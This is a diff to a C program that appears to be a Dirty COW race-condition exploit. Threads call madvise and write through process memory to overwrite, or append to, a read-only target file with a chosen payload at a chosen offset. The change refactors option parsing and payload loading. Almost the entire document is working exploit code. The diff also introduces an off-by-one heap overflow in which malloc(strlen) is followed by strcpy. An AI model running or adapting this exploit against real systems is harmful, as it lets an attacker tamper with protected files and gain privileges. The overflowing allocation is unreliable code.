@@ -38,18 +38,17 @@
 int stop = 0;
 
 typedef struct payload_info {
-	char *string;
+	char *payload;
 	off_t offset;
 	void *loc_in_mem;
 	int target_fd;
-	int input_fd;
 	bool append;
 } PayloadInfo;
 
 // Write payload to mmap'd memory
 void *writer_thread(void *arg) {
 	PayloadInfo *info = arg;
-	char *str = info->string;
+	char *str = info->payload;
 
 	int fd = open(VIRTUAL_MEMORY, O_RDWR);
 	ERR_IF(fd < 0);
@@ -75,7 +74,7 @@ void *madviser_thread(void *arg) {
 
 void *wait_for_write(void *arg) {
 	PayloadInfo *info = arg;
-	size_t len = strlen(info->string);
+	size_t len = strlen(info->payload);
 
 	while (true) {
 		char buf[len];
@@ -87,7 +86,7 @@ void *wait_for_write(void *arg) {
 		ERR_IF(lseek(fd, info->offset, SEEK_SET) < 0);
 		ERR_IF(read(fd, buf, len) < 0);
 
-		if (memcmp(buf, info->string, len) == 0 && !info->append) {
+		if (memcmp(buf, info->payload, len) == 0 && !info->append) {
 			printf("Target file is overwritten\n");
 			break;
 		}
@@ -105,7 +104,10 @@ void *wait_for_write(void *arg) {
 }
 
 // Load Payload into string from specified file
-char *load_payload(int fd) {
+char *read_file(char *path) {
+	int fd = open(path, O_RDONLY);
+	ERR_IF(fd < 0);
+
 	struct stat file_info;
 	ERR_IF(fstat(fd, &file_info) < 0);
 
@@ -126,51 +128,40 @@ void print_help(void) {
 			"\nTarget file name must be the last argument\n");
 }
 
+off_t parse_hex(char *str) {
+	unsigned int result;
+	sscanf(str, "%x", &result);
+	return (off_t) result;
+}
+
 PayloadInfo parse_opts(int argc, char *argv[]) {
 	PayloadInfo info = {
-		.input_fd = STDIN_FILENO,
 		.offset = 0x0,
 		.append = false
 	};
 
+	struct option longopts[] = {
+		{"file",    required_argument, 0, 'f' },
+		{"append",  no_argument,       0, 'a' },
+		{"string",  no_argument,       0, 's' },
+		{"offset",  required_argument, 0, 'o' },
+		{"help",    no_argument,       0, 'h' },
+		{0,         0,                 0,  0  }
+	};
+
 	int c;
 
- 	while (true) {
-		int option_index = 0;
-		struct option long_options[] = {
-			{"file",    required_argument, 0, 'f' },
-			{"append",  no_argument,       0, 'a' },
-			{"string",  no_argument,       0, 's' },
-			{"offset",  required_argument, 0, 'o' },
-			{"help",    no_argument,       0, 'h' },
-			{0,         0,                 0,  0  }
-		};
-
-		c = getopt_long(argc, argv, "ahs:f:o:", long_options, &option_index);
-
-		if (c == -1)
-			break;
-
+ 	while ((c = getopt_long(argc, argv, "ahs:f:o:", longopts, NULL)) != -1) {
 		switch (c) {
-			case 0:
-				printf("option %s", long_options[option_index].name);
-
-				if (optarg) {
-					printf(" with arg %s", optarg);
-				}
-
-				printf("\n");
-				break;
 			case 'f':  // file containing payload
-				info.input_fd = open(optarg, O_RDONLY);
-				ERR_IF(info.input_fd < 0);
-				info.string = load_payload(info.input_fd);
+				info.payload = read_file(optarg);
 				break;
 			case 'o':  // offset position for payload (hex)
-				sscanf(optarg, "%x", (unsigned int*) &info.offset);
+				info.offset = parse_hex(optarg);
 				break;
 			case 's':
-				info.string = argv[optind-1];
+				info.payload = malloc(strlen(optarg));
+				strcpy(info.payload, optarg);
 				break;
 			case 'a':  // append to target file
 				info.append = true;
@@ -178,20 +169,14 @@ PayloadInfo parse_opts(int argc, char *argv[]) {
 			case 'h':
 				print_help();
 				break;
-			case ':': // no option specified
-				printf("option needs a value\n");
-				break;
-			case '?': // unknown option
-				printf("unkown option: %c\n", optopt);
-				break;
-			default:
-				printf("?? getopt returned character code 0%o ??\n", c);
+			default: // unknown option
+				printf("unknown option: %c\n", optopt);
 				abort();
 		}
 	}
 
 	// Open target file
-	info.target_fd = open(argv[argc-1], O_RDONLY);
+	info.target_fd = open(argv[optind], O_RDONLY);
 	ERR_IF(info.target_fd < 0);
 
 	if (info.append) {
@@ -212,9 +197,6 @@ int main(int argc, char *argv[]) {
 
 	pthread_t thread_1, thread_2, thread_3;
 
-	char string[] = "Test insert string";
-	info.string = string;
-
 	ERR_IF_PTHREAD(pthread_create(&thread_1, NULL, madviser_thread, &info));
 	ERR_IF_PTHREAD(pthread_create(&thread_2, NULL, writer_thread, &info));
 	ERR_IF_PTHREAD(pthread_create(&thread_3, NULL, wait_for_write, &info));
@@ -223,13 +205,8 @@ int main(int argc, char *argv[]) {
 	ERR_IF_PTHREAD(pthread_join(thread_2, NULL));
 	ERR_IF_PTHREAD(pthread_join(thread_3, NULL));
 
-	close(info.input_fd);
 	close(info.target_fd);
-
-	// if memory allocated for storing payload from an input file, then free
-	if (info.input_fd != STDIN_FILENO) {
-		free(info.string);
-	}
+	free(info.payload);
 
 	return EXIT_SUCCESS;
 }
